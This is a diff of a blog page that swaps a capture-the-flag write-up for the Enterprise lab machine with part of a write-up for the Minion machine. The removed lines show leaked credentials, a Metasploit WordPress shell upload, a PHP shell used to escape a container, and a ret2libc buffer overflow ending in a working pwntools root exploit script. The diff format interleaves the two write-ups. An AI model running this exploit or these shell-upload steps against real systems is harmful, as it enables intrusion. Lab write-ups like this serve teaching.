-401,Guinan,&lt;blank&gt;,guinan@10.10.10.61,0,&lt;blank&gt;,&#34;{&#34;&#34;admin_style&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;admin_language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;editor&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;helpsite&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;timezone&#34;&#34;:&#34;&#34;&#34;&#34;}&#34;,Guinan,$2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q,0,&lt;blank&gt;,0,2017-09-06 12:38:03,0,0000-00-00 00:00:00,0000-00-00 00:00:00</code></pre></div></div></p>
-
-<p>Nice, we have found the credentials geordi.la.forge:ZD3YxfnSjezg67JZ for <a href="http://10.10.10.61:8080/administrator" target="_blank">http://10.10.10.61:8080/administrator</a></p>
-
-<h1 id="getting-shells">Getting shells</h1>
-
-<h2 id="getting-shell-on-wordpress-container">Getting shell on Wordpress container</h2>
-
-<p>We can get a shell on the wordpress container by editing or uploading plugins. You can do it via the web portal or metasploit etc:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">msf exploit(handler) &gt; use  exploit/unix/webapp/wp_admin_shell_upload 
-msf exploit(wp_admin_shell_upload) &gt; info
-
-Basic options:
-  Name       Current Setting     Required  Description
-  ----       ---------------     --------  -----------
-  PASSWORD   u*Z14ru0p#ttj83zS6  yes       The WordPress password to authenticate with
-  Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
-  RHOST      10.10.10.61         yes       The target address
-  RPORT      80                  yes       The target port (TCP)
-  SSL        false               no        Negotiate SSL/TLS for outgoing connections
-  TARGETURI  /                   yes       The base path to the wordpress application
-  USERNAME   william.riker       yes       The WordPress username to authenticate with
-  VHOST                          no        HTTP server virtual host</code></pre></div></div></p>
-
-<h2 id="getting-shell-on-joomla-container">Getting shell on Joomla container</h2>
-
-<p>We can get a shell on the Joomla container by editing the index.php of a template:
-Then just visit the url of that template: <a href="http://10.10.10.61:8080/templates/beez3" target="_blank">http://10.10.10.61:8080/templates/beez3</a></p>
-
-<h1 id="privilege-escalation">Privilege escalation</h1>
-
-<h2 id="escaping-from-the-joomla-container">Escaping from the Joomla container</h2>
-
-<p>We have a common shared folder /var/www/html/files/ between the Joomla container and the host on port 403. Therefore, if we upload our shell to /var/www/html/files/shell.php and then visit <a href="https://10.10.10.61/files/shell.php" target="_blank">https://10.10.10.61/files/shell.php</a> we can escape the Joomla container.</p>
-
-<h2 id="getting-root">Getting root</h2>
-
-<p>Port 32812 gave some interesting output on nmap scanning. Let&rsquo;s use nc to check it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ nc 10.10.10.61 32812
-nc: using stream socket
-
-                 _______ _______  ______ _______
-          |      |       |_____| |_____/ |______
-          |_____ |_____  |     | |    \_ ______|
-
-Welcome to the Library Computer Access and Retrieval System
-
-Enter Bridge Access Code:</code></pre></div></div></p>
-
-<p>Unfortunately we don&rsquo;t know the code. But now we have a shell. Let&rsquo;s see what is binding on port 32812
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ netstat -lntup | grep 32812
-tcp        0      0 0.0.0.0:32812           0.0.0.0:*               LISTEN      1471/xinetd</code></pre></div></div></p>
-
-<p>The xinetd daemon listens for incoming requests over a network and launches the appropriate service. Let&rsquo;s find what that service is:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ pstree
-systemd-+-VGAuthService
-        |-accounts-daemon-+-{gdbus}
-        |                 `-{gmain}
-        |-acpid
-        |-agetty
-        |-apache2---15*[apache2]
-        |-atd
-        |-cron
-        |-dbus-daemon
-        |-dockerd-+-docker-containe-+-docker-containe-+-mysqld---37*[{mysqld}]
-        |         |                 |                 `-9*[{docker-containe}]
-        |         |                 |-docker-containe-+-apache2---10*[apache2]
-        |         |                 |                 `-8*[{docker-containe}]
-        |         |                 |-docker-containe-+-apache2-+-2*[apache2-sh-php-{msf}]
-        |         |                 |                 |         `-10*[apache2]
-        |         |                 |                 `-9*[{docker-containe}]
-        |         |                 `-13*[{docker-containe}]
-        |         |-docker-proxy---4*[{docker-proxy}]
-        |         |-docker-proxy---3*[{docker-proxy}]
-        |         `-16*[{dockerd}]
-        |-irqbalance
-        |-2*[iscsid]
-        |-lvmetad
-        |-lxcfs---2*[{lxcfs}]
-        |-polkitd-+-{gdbus}
-        |         `-{gmain}
-        |-rsyslogd-+-{in:imklog}
-        |          |-{in:imuxsock}
-        |          `-{rs:main Q:Reg}
-        |-snapd---7*[{snapd}]
-        |-sshd
-        |-systemd---(sd-pam)
-        |-systemd-journal
-        |-systemd-logind
-        |-systemd-resolve
-        |-systemd-timesyn---{sd-resolve}
-        |-systemd-udevd
-        |-vmtoolsd---{gmain}
-        `-xinetd---lcars</code></pre></div></div></p>
-
-<p>Well, the service is named &ldquo;lcars&rdquo;:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ which lcars
-/bin/lcars</code></pre></div></div></p>
-
-<p>Using ltrace we discover the access code for lcars:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ ltrace /bin/lcars
+[P$] minion\administrator@MINION Desktop&gt; Get-ScheduledTask | Where State -ne &#34;Disabled&#34; | Select TaskName
 ...
-strcmp(&#34;somedummyinput\n&#34;, &#34;picarda1&#34;)                    = -1
-...</code></pre></div></div></p>
+delete_logs
+...
 
-<p>If we explore a little the lcars app, we discover that there is a segmentation fault / buffer overflow:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">Enter Bridge Access Code:
-picarda1
+[P$] minion\administrator@MINION Desktop&gt; Get-ScheduledTask | Where TaskName -eq &#34;delete_logs&#34; | Get-ScheduledTaskInfo
+LastRunTime        : 10/14/2017 12:11:11 AM
+LastTaskResult     : 0
+NextRunTime        : 10/14/2017 12:16:16 AM
+NumberOfMissedRuns : 0
+TaskName           : delete_logs
+TaskPath           : \
+PSComputerName     : 
 
-Welcome to the Library Computer Access and Retrieval System
+[P$] minion\administrator@MINION Desktop&gt; Export-ScheduledTask -Taskname delete_logs
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-16&#34;?&gt;
+&lt;Task version=&#34;1.2&#34; xmlns=&#34;http://schemas.microsoft.com/windows/2004/02/mit/task&#34;&gt;
+  &lt;RegistrationInfo&gt;
+    &lt;Date&gt;2017-08-10T16:36:36.2851262&lt;/Date&gt;
+    &lt;Author&gt;WIN-2RTO3C7989S\Administrator&lt;/Author&gt;
+  &lt;/RegistrationInfo&gt;
+  &lt;Triggers&gt;
+    &lt;CalendarTrigger&gt;
+      &lt;Repetition&gt;
+        &lt;Interval&gt;PT5M&lt;/Interval&gt;
+        &lt;Duration&gt;P1D&lt;/Duration&gt;
+        &lt;StopAtDurationEnd&gt;false&lt;/StopAtDurationEnd&gt;
+      &lt;/Repetition&gt;
+      &lt;StartBoundary&gt;2017-08-10T16:36:16.9925913&lt;/StartBoundary&gt;
+      &lt;Enabled&gt;true&lt;/Enabled&gt;
+      &lt;ScheduleByDay&gt;
+        &lt;DaysInterval&gt;1&lt;/DaysInterval&gt;
+      &lt;/ScheduleByDay&gt;
+    &lt;/CalendarTrigger&gt;
+  &lt;/Triggers&gt;
+  &lt;Principals&gt;
+    &lt;Principal id=&#34;Author&#34;&gt;
+      &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
+      &lt;UserId&gt;decoder&lt;/UserId&gt;
+      &lt;LogonType&gt;Password&lt;/LogonType&gt;
+    &lt;/Principal&gt;
+  &lt;/Principals&gt;
+  &lt;Settings&gt;
+    &lt;MultipleInstancesPolicy&gt;Parallel&lt;/MultipleInstancesPolicy&gt;
+    &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;
+    &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;
+    &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;
+    &lt;StartWhenAvailable&gt;false&lt;/StartWhenAvailable&gt;
+    &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;
+    &lt;IdleSettings&gt;
+      &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;
+      &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;
+    &lt;/IdleSettings&gt;
+    &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;
+    &lt;Enabled&gt;true&lt;/Enabled&gt;
+    &lt;Hidden&gt;false&lt;/Hidden&gt;
+    &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;
+    &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;
+    &lt;ExecutionTimeLimit&gt;PT1H&lt;/ExecutionTimeLimit&gt;
+    &lt;Priority&gt;7&lt;/Priority&gt;
+  &lt;/Settings&gt;
+  &lt;Actions Context=&#34;Author&#34;&gt;
+    &lt;Exec&gt;
+      &lt;Command&gt;C:\sysadmscripts\del_logs.bat&lt;/Command&gt;
+    &lt;/Exec&gt;
+  &lt;/Actions&gt;
+&lt;/Task&gt;</code></pre></div></div></p>
 
-LCARS Bridge Secondary Controls -- Main Menu: 
-
-1. Navigation
-2. Ships Log
-3. Science
-4. Security
-5. StellaCartography
-6. Engineering
-7. Exit
-Waiting for input: 
-4
-Disable Security Force Fields
-Enter Security Override:
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-Segmentation fault</code></pre></div></div></p>
-
-<p>Let&rsquo;s find more about this using gdb:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ gdb /bin/lcars
-
-(gdb) $ info functions
-All defined functions:
-
-Non-debugging symbols:
-0x00000508  _init
-0x00000540  strcmp@plt
-0x00000550  setresuid@plt
-0x00000560  printf@plt
-0x00000570  fflush@plt
-0x00000580  fgets@plt
-0x00000590  puts@plt
-0x000005a0  exit@plt
-0x000005b0  __libc_start_main@plt
-0x000005c0  __isoc99_scanf@plt
-0x000005e0  _start
-0x00000620  __x86.get_pc_thunk.bx
-0x00000630  deregister_tm_clones
-0x00000670  register_tm_clones
-0x000006c0  __do_global_dtors_aux
-0x00000710  frame_dummy
-0x0000074c  __x86.get_pc_thunk.dx
-0x00000750  startScreen
-0x000007d4  disableForcefields
-0x0000085e  main_menu
-0x00000b6a  unable
-0x00000ba8  bridgeAuth
-0x00000c91  main
-0x00000d30  __libc_csu_init
-0x00000d90  __libc_csu_fini
-0x00000d94  _fini</code></pre></div></div></p>
-
-<p>Let&rsquo;s have a look inside the function disableForcefields:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">(gdb) $ set disassembly-flavor intel
-(gdb) $ disass disableForcefields
-Dump of assembler code for function disableForcefields:
-   0x000007d4 &lt;+0&gt;:    push   ebp
-   0x000007d5 &lt;+1&gt;:    mov    ebp,esp
-   0x000007d7 &lt;+3&gt;:    push   ebx
-   0x000007d8 &lt;+4&gt;:    sub    esp,0xd4
-   0x000007de &lt;+10&gt;:    call   0x620 &lt;__x86.get_pc_thunk.bx&gt;
-   0x000007e3 &lt;+15&gt;:    add    ebx,0x281d
-   0x000007e9 &lt;+21&gt;:    call   0x750 &lt;startScreen&gt;
-   0x000007ee &lt;+26&gt;:    sub    esp,0xc
-   0x000007f1 &lt;+29&gt;:    lea    eax,[ebx-0x2173]
-   0x000007f7 &lt;+35&gt;:    push   eax
-   0x000007f8 &lt;+36&gt;:    call   0x590 &lt;puts@plt&gt;
-   0x000007fd &lt;+41&gt;:    add    esp,0x10
-   0x00000800 &lt;+44&gt;:    sub    esp,0xc
-   0x00000803 &lt;+47&gt;:    lea    eax,[ebx-0x2155]
-   0x00000809 &lt;+53&gt;:    push   eax
-   0x0000080a &lt;+54&gt;:    call   0x590 &lt;puts@plt&gt;
-   0x0000080f &lt;+59&gt;:    add    esp,0x10
-   0x00000812 &lt;+62&gt;:    mov    eax,DWORD PTR [ebx-0x10]
-   0x00000818 &lt;+68&gt;:    mov    eax,DWORD PTR [eax]
-   0x0000081a &lt;+70&gt;:    sub    esp,0xc
-   0x0000081d &lt;+73&gt;:    push   eax
-   0x0000081e &lt;+74&gt;:    call   0x570 &lt;fflush@plt&gt;
-   0x00000823 &lt;+79&gt;:    add    esp,0x10
-   0x00000826 &lt;+82&gt;:    sub    esp,0x8
-   0x00000829 &lt;+85&gt;:    lea    eax,[ebp-0xd0]
-   0x0000082f &lt;+91&gt;:    push   eax
-   0x00000830 &lt;+92&gt;:    lea    eax,[ebx-0x213c]
-   0x00000836 &lt;+98&gt;:    push   eax
-   0x00000837 &lt;+99&gt;:    call   0x5c0 &lt;__isoc99_scanf@plt&gt;
-   0x0000083c &lt;+104&gt;:    add    esp,0x10
-   0x0000083f &lt;+107&gt;:    sub    esp,0x8
-   0x00000842 &lt;+110&gt;:    lea    eax,[ebp-0xd0]
-   0x00000848 &lt;+116&gt;:    push   eax
-   0x00000849 &lt;+117&gt;:    lea    eax,[ebx-0x2138]
-   0x0000084f &lt;+123&gt;:    push   eax
-   0x00000850 &lt;+124&gt;:    call   0x560 &lt;printf@plt&gt;
-   0x00000855 &lt;+129&gt;:    add    esp,0x10
-   0x00000858 &lt;+132&gt;:    nop
-   0x00000859 &lt;+133&gt;:    mov    ebx,DWORD PTR [ebp-0x4]
-   0x0000085c &lt;+136&gt;:    leave  
-   0x0000085d &lt;+137&gt;:    ret    
-End of assembler dump.</code></pre></div></div></p>
-
-<p>Let&rsquo;s explain some things. In general, when we look at the disassembly code at the top of a function we&rsquo;ll see something like this:
-<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">push</span>   <span class="no">ebp</span>                  <span class="err">//</span><span class="no">backup</span> <span class="no">caller</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">ebp</span>
-<span class="nf">mov</span>    <span class="no">ebp</span><span class="p">,</span><span class="no">esp</span>              <span class="err">//</span><span class="no">set</span> <span class="no">callee</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">ebp</span> <span class="no">to</span> <span class="no">esp</span>
-<span class="nf">sub</span>    <span class="no">esp</span><span class="p">,</span> <span class="err">&lt;</span><span class="no">some</span> <span class="no">number</span><span class="err">&gt;</span>   <span class="err">//</span><span class="no">stack</span> <span class="no">space</span> <span class="no">for</span> <span class="no">local</span> <span class="no">variables</span></code></pre></div></p>
-
-<p>The ebp register will point to the top of our stack for this frame, and esp will point to the next available byte on the stack (stacks typically grow downwards). Now, although we can try different string sizes to find out the correct size for our payload header, we can also try to calculate it. It is quite simple actually. We just find the difference between the numbers in commands that subtract from esp (sub esp, ) and those in commands that add to esp (add esp, ) till the call to __isoc99_scanf function.</p>
-
-<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="na">...</span>
-<span class="err">0</span><span class="nf">x000007d8</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xd4</span><span class="p">,</span><span class="nv">%esp</span>
-<span class="na">...</span>
-<span class="err">0</span><span class="nf">x000007ee</span> <span class="err">&lt;+</span><span class="mi">26</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xc</span><span class="p">,</span><span class="nv">%esp</span>
-<span class="na">...</span>
-<span class="err">0</span><span class="nf">x000007fd</span> <span class="err">&lt;+</span><span class="mi">41</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">$0x10</span><span class="p">,</span><span class="nv">%esp</span>
-<span class="err">0</span><span class="nf">x00000800</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xc</span><span class="p">,</span><span class="nv">%esp</span>
-<span class="na">...</span>
-<span class="err">0</span><span class="nf">x0000080f</span> <span class="err">&lt;+</span><span class="mi">59</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">$0x10</span><span class="p">,</span><span class="nv">%esp</span>
-<span class="na">...</span>
-<span class="err">0</span><span class="nf">x0000081a</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xc</span><span class="p">,</span><span class="nv">%esp</span>
-<span class="na">...</span>
-<span class="err">0</span><span class="nf">x00000823</span> <span class="err">&lt;+</span><span class="mi">79</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">$0x10</span><span class="p">,</span><span class="nv">%esp</span>
-<span class="err">0</span><span class="nf">x00000826</span> <span class="err">&lt;+</span><span class="mi">82</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0x8</span><span class="p">,</span><span class="nv">%esp</span>
-<span class="na">...</span></code></pre></div>
-
-<p>Therefore: 0xd4 + 0xc - 0x10 + 0xc - 0x10 + 0xc - 0x10 + 0x8 = 0xd0 = 208</p>
-
-<p>In order to overwrite the return address (i.e. eip) with our payload, we have to add 4 to account for pushing caller&rsquo;s ebp into the stack. So our payload header will be 208+4 = 212. If you don&rsquo;t know what I am talking about read this: <a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/" target="_blank">https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/</a></p>
-
-<p>Now, let&rsquo;s check if ASLR is enabled on the box:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cat /proc/sys/kernel/randomize_va_space
-0</code></pre></div></div></p>
-
-<p>Nice, ASLR is disabled. Now let&rsquo;s find some useful addresses for our ret2libc payload:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">gdb /bin/lcars
-(gdb) print &amp;system
-$1 = (&lt;text variable, no debug info&gt; *) 0xf7e4c060 &lt;system&gt;
-(gdb) print &amp;exit
-$2 = (&lt;text variable, no debug info&gt; *) 0xf7e3faf0 &lt;exit&gt;
-
-find &amp;system,+9999999,&#34;/bin/sh&#34;  
-0xf7f70a0f</code></pre></div></div></p>
-
-<p>If we try to use the address 0xf7f70a0f, it won&rsquo;t work because it contains a newline ASCII code (0x0a). Depending on the context, the scanf() function either removes whitespace or stops reading after a whitespace.</p>
-
-<p>Let&rsquo;s search for plain &lsquo;sh&rsquo;:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">(gdb) find &amp;system,+9999999,&#34;sh&#34;       
-0xf7f6ddd5
-0xf7f6e7e1
-0xf7f70a14
-0xf7f72582</code></pre></div></div></p>
-
-<p>The address 0xf7f6ddd5 seems just fine.</p>
-
-<h2 id="autopwn-script">Autopwn script</h2>
-
-<p>Here is an autopwn script I wrote:
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
-<span class="c1"># Author: Alamot</span>
-<span class="kn">import</span> <span class="nn">time</span>
-<span class="kn">import</span> <span class="nn">struct</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
-
-<span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">False</span>
-<span class="n">RHOST</span> <span class="o">=</span> <span class="s2">&#34;10.10.10.61&#34;</span>
-<span class="n">RPORT</span> <span class="o">=</span> <span class="mi">32812</span>
-
-<span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
-    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
-<span class="k">else</span><span class="p">:</span>
-    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
-
-<span class="k">def</span> <span class="nf">conv</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span><span class="n">num</span><span class="p">)</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">212</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="mh">0xf7e4c060</span><span class="p">)</span> <span class="c1"># system()</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="mh">0xf7e3faf0</span><span class="p">)</span> <span class="c1"># exit()</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="mh">0xf7f6ddd5</span><span class="p">)</span> <span class="c1"># &#39;sh&#39;</span>
-
-<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">RHOST</span><span class="p">,</span> <span class="n">RPORT</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Enter Bridge Access Code: &#34;</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;picarda1&#34;</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Waiting for input: &#34;</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Enter Security Override:&#34;</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div></p>
-
-<p>That&rsquo;s all folks! :)</p>
-
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ ./pwn_lcars.py 
-[+] Opening connection to 10.10.10.61 on port 32812: Done
-[*] Switching to interactive mode
-
-$ whoami
-root</code></pre></div></div>
+<p>Thal&rsquo;s all folks :)</p>
 
         </div>
 
         <aside>
           <div class="p-share centered">
-            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2fenterprise_writeup%2f&t=Enterprise%20write-up" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
-            <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2fenterprise_writeup%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
-            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fenterprise_writeup%2f&text=Enterprise%20write-up&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fenterprise_writeup%2f&text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Enterprise&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fenterprise_writeup%2f&description=Enterprise%20write-up&media=https://alamot.github.io/images/space.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
-            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fenterprise_writeup%2f&description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Enterprise&media=https://alamot.github.io/images/space.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2fminion_writeup%2f&t=Minion%20write-up" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
+            <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2fminion_writeup%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
+            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fminion_writeup%2f&text=Minion%20write-up&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fminion_writeup%2f&text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Minion&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fminion_writeup%2f&description=Minion%20write-up&media=https://alamot.github.io/images/minions.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fminion_writeup%2f&description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Minion&media=https://alamot.github.io/images/minions.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
           </div>
         </aside>
       </article>
@@ -993,22 +730,6 @@ root</code></pre></div></div>
           
            
            
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1033,6 +754,22 @@ root</code></pre></div></div>
           
            
            
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Enterprise write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Mar 2018</time>
+      <time lang="el">19 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1170,22 +907,6 @@ root</code></pre></div></div>
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/rold/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
-      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">16 Aug 2015</time>
-      <time lang="el">16 Αυγ 2015</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
@@ -1201,22 +922,6 @@ root</code></pre></div></div>
           
            
            
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
-    <div class="cell">
